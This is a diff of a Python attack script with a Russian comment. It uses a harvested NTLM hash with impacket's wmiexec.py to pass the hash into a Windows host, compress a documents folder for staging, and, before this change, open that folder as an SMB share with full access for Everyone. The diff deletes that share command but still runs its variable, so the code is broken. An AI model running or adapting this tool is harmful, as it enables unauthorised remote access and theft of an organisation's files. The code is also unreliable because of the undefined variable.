@@ -1,3 +1,4 @@
+# -*- coding: cp1251 -*-
 import subprocess
 import re
 import sys
@@ -12,8 +13,7 @@ username = sys.argv[2]
 password = sys.argv[3]
 dc_ip = sys.argv[4]
 target_computer = sys.argv[5]
-pip_exec="python -m pip install impacket"
-subprocess.run(pip_exec, shell=True)
+
 # Проверяем, есть ли уже пользователь fedorov в файле hashes.txt
 user_hash = None
 try:
@@ -52,8 +52,7 @@ if user_hash is None:
         exit(1)
 
 win_exec = f'wmiexec.py -hashes {user_hash} company/ivanov@10.69.4.5 "powershell.exe Compress-Archive -Path \'C:\\documents\\*\' -DestinationPath \'C:\\documents.zip\'"'
-print(user_hash)
 subprocess.run(win_exec, shell=True)
 
-win_exec_smb = f'wmiexec.py -hashes {user_hash} company/ivanov@10.69.4.5 "powershell.exe New-SmbShare -Name \\"ShareAll\\" -Path \\"C:\\\\documents\\" -FullAccess \\"Everyone\\""'
+
 subprocess.run(win_exec_smb, shell=True)
